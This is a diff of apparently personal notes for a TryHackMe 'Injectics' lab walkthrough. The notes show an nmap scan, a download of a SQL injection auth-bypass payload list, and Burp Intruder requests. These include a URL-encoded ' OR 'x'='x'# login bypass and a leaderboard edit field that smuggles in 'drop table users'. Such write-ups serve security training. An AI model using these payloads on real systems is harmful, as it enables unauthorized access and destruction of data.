@@ -1,3 +1,11 @@
+```embed
+title: "TryHackMe: Injectics Walkthrough"
+image: "https://miro.medium.com/v2/resize:fit:1200/1*_A-Bx9cerx9C9mM4vaEA8Q.png"
+description: "In this writeup, I document my process and methodology for the TryHackMe Injectics room. This exercise shows how I used different injection…"
+url: "https://medium.com/@trixiahorner/tryhackme-injectics-walkthrough-c62f0df2a434"
+```
+
+
 1) Conduct Nmap Scans
 ```bash
 ┌──(sstephens㉿kali-ppt)-[~]
@@ -70,6 +78,7 @@ Finished
 ```
 
 Home Page - Source gives clue to mail.log
+
 ```html
 From: dev@injectics.thm
 To: superadmin@injectics.thm
@@ -99,4 +108,85 @@ dev@injectics.thm
 ```
 http://10.10.239.104/adminLogin007.php
 
+```
+
+Download a beefy sql injection Auth bypass list
+```bash
+wget https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
+```
+
+Run a sniper attack from burp with the list
+```javascript
+POST /functions.php HTTP/1.1
+Host: 10.10.206.147
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 44
+Origin: http://10.10.206.147
+Connection: keep-alive
+Referer: http://10.10.206.147/login.php
+Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5
+
+username=§admin§&password=test&function=login
+```
+
+```javascript
+POST /functions.php HTTP/1.1
+Host: 10.10.206.147
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 80
+Origin: http://10.10.206.147
+Connection: keep-alive
+Referer: http://10.10.206.147/login.php
+Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5
+
+username=%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b&password=test&function=login
+```
+
+Refresh the screen
+Edit an entry to capture the request
+```javascript
+POST /edit_leaderboard.php HTTP/1.1
+Host: 10.10.206.147
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://10.10.206.147
+Connection: keep-alive
+Referer: http://10.10.206.147/edit_leaderboard.php?rank=1&country=USA
+Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5
+Upgrade-Insecure-Requests: 1
+
+rank=1&country=&gold=22&silver=21&bronze=12345
+```
+
+Add our Drop Commands (Dont do this in production envs)
+```javascript
+POST /edit_leaderboard.php HTTP/1.1
+Host: 10.10.206.147
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://10.10.206.147
+Connection: keep-alive
+Referer: http://10.10.206.147/edit_leaderboard.php?rank=1&country=USA
+Cookie: PHPSESSID=v4hotumjkakui9hrnb1ptrnnr5
+Upgrade-Insecure-Requests: 1
+
+rank=1&country=&gold=22; drop table users -- -&silver=21&bronze=12345
 ```
